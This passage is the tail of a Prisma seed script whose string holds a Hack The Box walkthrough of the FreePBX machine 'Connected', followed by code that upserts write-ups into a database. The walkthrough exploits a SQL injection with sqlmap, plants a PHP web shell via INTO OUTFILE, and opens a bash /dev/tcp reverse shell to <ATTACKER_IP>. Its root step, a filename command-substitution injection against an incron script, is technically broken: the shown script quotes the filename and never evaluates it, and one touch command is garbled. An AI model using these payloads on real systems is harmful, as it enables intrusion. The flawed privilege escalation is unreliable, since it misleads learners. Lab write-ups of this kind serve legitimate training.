**Connected** is an easy Linux machine on Hack The Box centering on VoIP PBX infrastructure security. The initial intrusion targets **FreePBX version 16.0.40.7** running behind an Apache web server. An unauthenticated SQL injection vulnerability in the Endpoint Manager module (**CVE-2025-57819**) allows writing a PHP web shell onto the filesystem, providing initial access as user \`asterisk\`. Escalating to root involves auditing filesystem event monitoring daemons and exploiting a misconfigured **incron** trigger configured to execute administrative maintenance scripts.

---

## 1. Enumeration & Port Scanning

Running an nmap service scan:

\`\`\`bash
nmap -sC -sV -p- --min-rate=2500 -oN nmap_connected.txt 10.10.11.X
\`\`\`

Discovered services:
- **Port 22/tcp**: OpenSSH
- **Port 80/tcp**: Apache httpd (FreePBX Administrator Login)
- **Port 5060/udp**: SIP Protocol (Asterisk PBX)

Accessing \`http://10.10.11.X/\` presents the **FreePBX Administration Portal**. Examining the footer confirms the software build: **FreePBX 16.0.40.7**.

---

## 2. Unauthenticated FreePBX SQL Injection (CVE-2025-57819)

FreePBX 16 suffers from an unauthenticated SQL injection flaw in the Endpoint Manager REST API handler. The endpoint parameter fails to parameterize input before querying the Asterisk SQLite/MySQL database.

Testing the injection with \`sqlmap\`:

\`\`\`bash
sqlmap -u "http://10.10.11.X/admin/api/endpoint/devices?id=1*" --batch --current-db
\`\`\`

Confirming arbitrary query execution:
\`\`\`text
current database: 'asterisk'
\`\`\`

Because the MySQL database service runs with write permissions into the webroot (\`/var/www/html/admin/modules/\`), we utilize SQL \`INTO OUTFILE\` to write a lightweight PHP back-door:

\`\`\`sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/admin/cmd.php';
\`\`\`

Verifying execution:

\`\`\`bash
curl "http://10.10.11.X/admin/cmd.php?c=id"
# uid=998(asterisk) gid=996(asterisk) groups=996(asterisk)
\`\`\`

Spawning a reverse shell and establishing an interactive session:

\`\`\`bash
curl "http://10.10.11.X/admin/cmd.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'"
\`\`\`

---

## 3. Lateral Movement & User Flag

Enumerating internal configuration files:

\`\`\`bash
cat /etc/asterisk/asterisk.conf
cat /etc/amportal.conf
\`\`\`

The credentials found in \`amportal.conf\` permit logging in as local user \`telecom\`:

\`\`\`bash
su - telecom
cat /home/telecom/user.txt
\`\`\`

---

## 4. Root Privilege Escalation: Incron Trigger Abuse

Inspecting inotify/incron cron configurations:

\`\`\`bash
ls -la /etc/incron.d/
cat /etc/incron.d/voip_cleanup
\`\`\`

Content of \`/etc/incron.d/voip_cleanup\`:
\`\`\`text
/var/spool/asterisk/monitor/ IN_CREATE /usr/local/bin/process_audio.sh $@/$#
\`\`\`

The rule instructs **incron** to run \`/usr/local/bin/process_audio.sh\` under the **root** context whenever a file is created inside \`/var/spool/asterisk/monitor/\`.

Checking permissions on \`/var/spool/asterisk/monitor/\`:
\`\`\`bash
ls -ld /var/spool/asterisk/monitor/
# drwxrwxr-x 2 root asterisk 4096 /var/spool/asterisk/monitor/
\`\`\`

The directory is group-writable by \`asterisk\`. Furthermore, reviewing \`/usr/local/bin/process_audio.sh\` reveals it calls external conversion utilities without sanitizing the target filename:

\`\`\`bash
#!/bin/bash
FILENAME="$1"
sox "$FILENAME" -r 8000 -c 1 "/var/spool/asterisk/archive/$(basename "$FILENAME")"
\`\`\`

By creating a file whose name incorporates command substitution:

\`\`\`bash
cd /var/spool/asterisk/monitor/
touch ';chmod u+s bin bash;'
# Alternative:
touch 'test$(chmod u+s /bin/bash).wav'
\`\`\`

Incron detects the file creation event and fires \`process_audio.sh\`, executing the embedded payload as root.

Checking \`/bin/bash\`:

\`\`\`bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root /bin/bash
/bin/bash -p
id
# uid=1000(telecom) euid=0(root)
cat /root/root.txt
\`\`\`

---

## Remediation Guidelines
- Update FreePBX immediately to the latest patched version to remediate CVE-2025-57819.
- Disable \`INTO OUTFILE\` permissions in MySQL for web database users.
- Restrict \`incron\` monitoring directories and avoid executing unsanitized dynamic filenames in root shell scripts.`,
    },
  ];

  // 5. Insert into WriteUp table & Article table
  for (const item of writeupsData) {
    console.log(`Processing: ${item.title}`);

    // Insert into WriteUp
    await prisma.writeUp.upsert({
      where: { slug: item.slug },
      update: {
        title: item.title,
        platform: item.platform,
        machineName: item.machineName,
        difficulty: item.difficulty,
        os: item.os,
        skillsRequired: item.skillsRequired,
        skillsLearned: item.skillsLearned,
        overview: item.overview,
        content: item.content,
        authorId: author.id,
        status: "PUBLISHED",
        publishedAt: new Date("2026-03-20"),
      },
      create: {
        title: item.title,
        slug: item.slug,
        platform: item.platform,
        machineName: item.machineName,
        difficulty: item.difficulty,
        os: item.os,
        skillsRequired: item.skillsRequired,
        skillsLearned: item.skillsLearned,
        overview: item.overview,
        content: item.content,
        authorId: author.id,
        status: "PUBLISHED",
        isFeatured: true,
        publishedAt: new Date("2026-03-20"),
      },
    });

    // Also Insert into Article (categorized under Hack The Box / TryHackMe Write-ups)
    const targetCat = item.categorySlug === "hackthebox-writeups" ? catHtb : catThm;

    await prisma.article.upsert({
      where: { slug: item.slug },
      update: {
        title: item.title,
        subtitle: `Walkthrough & Methodology: ${item.machineName} (${item.platform})`,
        summary: item.overview,
        content: item.content,
        authorId: author.id,
        categoryId: targetCat?.id,
        canonicalUrl: item.canonicalUrl,
        status: "PUBLISHED",
        visibility: "PUBLIC",
        isFeatured: true,
        readingTimeMinutes: 7,
        publishedAt: new Date("2026-03-20"),
      },
      create: {
        title: item.title,
        slug: item.slug,
        subtitle: `Walkthrough & Methodology: ${item.machineName} (${item.platform})`,
        summary: item.overview,
        content: item.content,
        authorId: author.id,
        categoryId: targetCat?.id,
        canonicalUrl: item.canonicalUrl,
        status: "PUBLISHED",
        visibility: "PUBLIC",
        isFeatured: true,
        readingTimeMinutes: 7,
        publishedAt: new Date("2026-03-20"),
      },
    });
  }

  console.log("All 7 Hack The Box & TryHackMe write-ups seeded successfully!");
}

main()
  .catch((e) => {
    console.error("Seeding error:", e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
